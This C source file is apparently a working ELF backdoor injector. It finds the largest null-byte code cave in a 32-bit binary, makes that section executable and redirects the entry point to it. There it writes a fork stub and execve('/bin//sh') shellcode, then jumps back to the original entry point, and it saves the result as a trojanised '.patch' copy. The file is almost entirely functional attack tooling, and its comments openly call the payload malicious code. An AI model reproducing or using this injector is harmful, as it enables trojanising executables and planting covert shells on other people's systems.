#include <elf-parser.h>
#include <errno.h>
#include <stdbool.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>

//#define DEBUG2
//#define VERBOSE

// Prototypes

char *findLongestCave(char *codeSec, int secSize, int *codecaveSize);

Elf32_Shdr *findSectionByName(const char *sectionName, int32_t fd, Elf32_Ehdr eh, Elf32_Shdr sh_table[]){
	uint32_t i;
	char* sh_str;	/* section-header string-table is also a section. */

	sh_str = read_section(fd, sh_table[eh.e_shstrndx]);

	for(i=0; i<eh.e_shnum; i++) {
		
		// If section was found
		if(strcmp(sectionName, (sh_str + sh_table[i].sh_name)) == 0){
			return &sh_table[i];
		}
	}

	return NULL;
}

void makeSectionExecutable(const char *sectionName, int32_t fd, Elf32_Ehdr eh, Elf32_Shdr sh_table[]){
	uint32_t i;
	char* sh_str;	/* section-header string-table is also a section. */

	sh_str = read_section(fd, sh_table[eh.e_shstrndx]);

	for(i=0; i<eh.e_shnum; i++) {
		
		// If section was found
		if(strcmp(sectionName, (sh_str + sh_table[i].sh_name)) == 0){
			sh_table[i].sh_flags |= 0b100;
			break;
		}
	}
}

char *getPatchedName(const char *orgName){
	static const char *EXTENSION = ".patch";

	int buffSize = strlen(orgName) + 1 + strlen(EXTENSION);
	char *newBuffer = (char *)malloc(buffSize);
	strncpy(newBuffer, orgName, buffSize);
	strcat(newBuffer, EXTENSION);

	return newBuffer;
}

bool duplicateFile(const char *orgFilename, char *newFilename){
	int fds[2];
	int bytesRead;
	char buff[2048];

	fds[0] = open(orgFilename, O_RDONLY);
	fds[1] = open(newFilename, O_CREAT | O_RDWR);

	while((bytesRead = read(fds[0], buff, sizeof(buff))) > 0){
		if(!write(fds[1], buff, bytesRead)){
			return false;
		}
	}

	chmod(newFilename, 0664);

	return true;
}

struct codecave {
	char secName[32];
	void *physicalOffset;
	int length;
} typedef codecave;

codecave *getWinnerCodecave(codecave *caves, int cavesNum){
	int max = 0;
	codecave *winner = NULL;

	for(int i = 0 ;i<cavesNum; i++){
		if(caves[i].length > max){
			max = caves[i].length;
			winner = &caves[i];
		}
	}

	return winner;
}

void codecave_display(codecave *self){

printf(
"======== CAVE ========\n\
Section     : %s\n\
File offset : %p\n\
Cave size   : %d\n\n", self->secName, self->physicalOffset, self->length);
}

void codecave_summary(codecave *caves, int cavesNum){
	codecave *winner = getWinnerCodecave(caves, cavesNum);
	
	for(int i = 0;i < cavesNum; i++){
		if(&caves[i] == winner){
			puts("**** We have a winner ****");
		}

		codecave_display(&caves[i]);
	}
}

char *extractSectionContent(Elf32_Shdr *currentSec, int32_t fd, Elf32_Ehdr eh, int *readSize){
	int secSize = currentSec->sh_size;
	char *codeBuffer = (char *)malloc(secSize);
	
	assert(lseek(fd, (off_t)currentSec->sh_offset, SEEK_SET) == (off_t)currentSec->sh_offset);
	read(fd, codeBuffer, secSize);

	if(readSize != NULL ){
		*readSize = secSize;
	}

	return codeBuffer;
}

codecave *searchCodecaves(int32_t fd, Elf32_Ehdr eh, Elf32_Shdr sh_table[], int *cavesNumber){
	uint32_t i;
	char* sh_str;	/* section-header string-table is also a section. */
	int currentCaves = 0;
	char *sectionContent;

	codecave *caves = (codecave *) malloc(sizeof(codecave));

	sh_str = read_section(fd, sh_table[eh.e_shstrndx]);

	for(i=0; i<eh.e_shnum; i++) {
		int   readBytes;
		int   currentCaveSize;
		char *currentCave;

		sectionContent = extractSectionContent(&sh_table[i], fd, eh, &readBytes);
		currentCave = findLongestCave(sectionContent, readBytes, &currentCaveSize);

		if(currentCave != NULL){
			caves = (codecave *) realloc(caves, sizeof(codecave) * (++currentCaves));
			codecave temp; 

			strncpy(temp.secName, (sh_str + sh_table[i].sh_name), 32);
			temp.physicalOffset = (void *)(sh_table[i].sh_offset + (currentCave - sectionContent));
			temp.length = currentCaveSize;

			caves[currentCaves - 1] = temp;
		}

		//free(sectionContent); // ???
	}

	if(cavesNumber != NULL){
		*cavesNumber = currentCaves;
	}

	if (currentCaves == 0){
		free(caves);
		return NULL;
	}

	return caves;
}

int createPatch(const char *orgName){
	char *name = getPatchedName(orgName);
	int fd = open(name, O_RDWR | O_CREAT);

	return fd;
}

void writeFileHeader(int fd, Elf32_Ehdr *eh){
	assert(eh != NULL);
	assert(lseek(fd, (off_t)0, SEEK_SET) == (off_t)0);
	assert(write(fd, (void *)eh, sizeof(Elf32_Ehdr)) == sizeof(Elf32_Ehdr));
}

void writeSectionTable(int32_t fd, Elf32_Ehdr *eh, Elf32_Shdr sh_table[]){
	uint32_t i;

	assert(lseek(fd, (off_t)eh->e_shoff, SEEK_SET) == (off_t)eh->e_shoff);

	for(i=0; i<eh->e_shnum; i++) {
		assert(write(fd, (void *)&sh_table[i], eh->e_shentsize)
				== eh->e_shentsize);
	}
}

char *extractCodeSection(int32_t fd, Elf32_Ehdr eh, Elf32_Shdr sh_table[], int *readSize){
	Elf32_Shdr *codeSec = findSectionByName(".text", fd, eh, sh_table);
	int secSize = codeSec->sh_size;
	char *codeBuffer = (char *)malloc(secSize);
	
	assert(lseek(fd, (off_t)codeSec->sh_offset, SEEK_SET) == (off_t)codeSec->sh_offset);
	read(fd, codeBuffer, secSize);

	if(readSize != NULL ){
		*readSize = secSize;
	}

	return codeBuffer;
}

struct x86ByteInstruction
{
	char opcode;
	char additionalSize;
	char additionalCode[4];
} typedef x86ByteInstruction;

// NOP Instruction
x86ByteInstruction stubInst;

x86ByteInstruction assembleJMPInstruction(int offset){
	x86ByteInstruction opcode;

	// Jmp opcode
	opcode.opcode = '\xE9';
	opcode.additionalSize = 4;
	int range;

	if(offset >= 4){
		range = offset - 4;
	}
	else if(offset < 0){
		range = offset - 4;
	}
	else{
		errno = 1;
		return stubInst;
	}

	memcpy(opcode.additionalCode, &range, sizeof(int));
	return opcode;
}

char *generateBackdoorCode(char startCode[4], char *maliciousCode, int maliciousCodeSize, int *newSize) {
	char *template = "\x31\xc0\x40\x40\xcd\x80\x85\xc0\x74\x07\xbd\x44\x43\x42\x41\xff\xe5\x90\x90\x90\x90";
	const int stubSize = 4;
	char startCodeRev[4];
	
	// Reverse startCode address
	for(int i = 0; i < 4; i++){
		startCodeRev[i] = startCode[4 - i - 1];
	}

	int bufSize = strlen(template) - stubSize + maliciousCodeSize;
	char *buffer = (char *)malloc(bufSize);

	// Copy template
	memset(buffer, 0x90, bufSize);
	memcpy(buffer, template, strlen(template));

	// Inject start code
	char *fakeAddrPtr = strstr(buffer, "\x44\x43\x42\x41");
	memcpy(fakeAddrPtr, startCodeRev, 4);

	// Inject start code
	char *stubPtr = strstr(buffer, "\x90\x90\x90\x90");
	memcpy(stubPtr, maliciousCode, maliciousCodeSize);

	*newSize = bufSize;
	return buffer;
}

int calcCaveVirtualAddress(codecave *cave, int32_t fd, Elf32_Ehdr eh, Elf32_Shdr sh_table[]){
	Elf32_Shdr *currentSection = findSectionByName(cave->secName, fd, eh, sh_table);

	// Integer overflow
	int caveOffset = (unsigned long)(cave->physicalOffset) - (unsigned long)(currentSection->sh_offset);

	return currentSection->sh_addr + caveOffset;
}

void littleEndianToBigEndian(void *addr, int size){
	char temp;
	char *p = (char *)addr;

	for (int i = 0; i < size / 2; i++)
	{
		temp = *(p + size - i - 1);
		*(p + size - i - 1) = *(p + i);
		*(p + i) = temp;
	}
}

char *findLongestCave(char *codeSec, int secSize, int *codecaveSize){
	static const int MIN_LENGTH = 9;

	int 	bytesIter		= 0;
	int 	currentSize		= 0;
	int 	biggest			= 0;
	char 	*longest		= NULL;
	char 	*beggining		= NULL;

	for(char *ptr = codeSec; bytesIter < secSize; ptr++, bytesIter++){
		if(*ptr == '\00'){
			if(currentSize == 0){
				beggining = ptr;
			}

			currentSize++;

			if(currentSize > biggest){
				biggest = currentSize;
				longest = beggining;
			}
		}
		else{
			currentSize = 0;
			beggining = NULL;
		}
	}

	if(biggest < MIN_LENGTH){
		//printf("biggest was %d :(\n", biggest);
		biggest = 0;
		longest = NULL;
	}

	if(codecaveSize != NULL){
		*codecaveSize = biggest;
	}

	return longest;
}

/* Main entry point of elf-parser */
int32_t main(int32_t argc, char *argv[])
{
	int32_t fd;
	Elf32_Ehdr eh;		/* elf-header is fixed size */

	if(argc!=2) {
		printf("Usage: elf-parser <ELF-file>\n");
		return 0;
	}

	if((fd = open(argv[1], O_RDONLY|O_SYNC)) < 0) {
		printf("Error %d Unable to open %s\n", fd, argv[1]);
		return 0;
	}

	/* ELF header : at start of file */
	read_elf_header(fd, &eh);
	if(!is_ELF(eh)) {
		return 0;
	}

	Elf32_Shdr *sh_tbl;	/* section-header table is variable size */
	
	#ifdef VERBOSE
	print_elf_header(eh);
	#endif

	/* Section header table :  */
	sh_tbl = malloc(eh.e_shentsize * eh.e_shnum);
	
	if(!sh_tbl) {
		printf("Failed to allocate %d bytes\n",
				(eh.e_shentsize * eh.e_shnum));
		exit(1);
	}

	read_section_header_table(fd, eh, sh_tbl);

	char *patchName = getPatchedName(argv[1]);
	duplicateFile(argv[1], patchName);
	int patchFD = open(patchName, O_RDWR);
	
	int cavesNum;
	codecave *caves = searchCodecaves(fd, eh, sh_tbl, &cavesNum);

	#ifdef VERBOSE
	printf("Caves found: %d\n", cavesNum);
	#endif

	#ifdef VERBOSE
	if (cavesNum > 0) codecave_summary(caves, cavesNum);
	#endif

	codecave *winner = getWinnerCodecave(caves, cavesNum);

	// Make the winner section executable
	makeSectionExecutable(winner->secName, patchFD, eh, sh_tbl);

	// Change entry point to new cave
	Elf32_Addr oldEntryPoint = eh.e_entry;
	eh.e_entry = calcCaveVirtualAddress(winner, patchFD, eh, sh_tbl);
	writeFileHeader(patchFD, &eh);

	// Generating malicious code
	char oldAddr[4];
	memcpy(&oldAddr, &oldEntryPoint, 4);
	int newEntryPointSize;
	littleEndianToBigEndian(oldAddr, 4);

	char payload[21] = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

	char *malEntryPointCode = generateBackdoorCode(oldAddr, payload, sizeof(payload), &newEntryPointSize);

	if(newEntryPointSize > winner->length) {
		puts("Code injection isn't possible!");
		exit(1);
	}

	// Write malicious code to code cave
	lseek(patchFD, (off_t)winner->physicalOffset, SEEK_SET);
	write(patchFD, (void *)malEntryPointCode, newEntryPointSize);

	#ifdef VERBOSE
	printf("entrypoint = 0x%x\n", eh.e_entry);
	#endif

	exit(0);
}
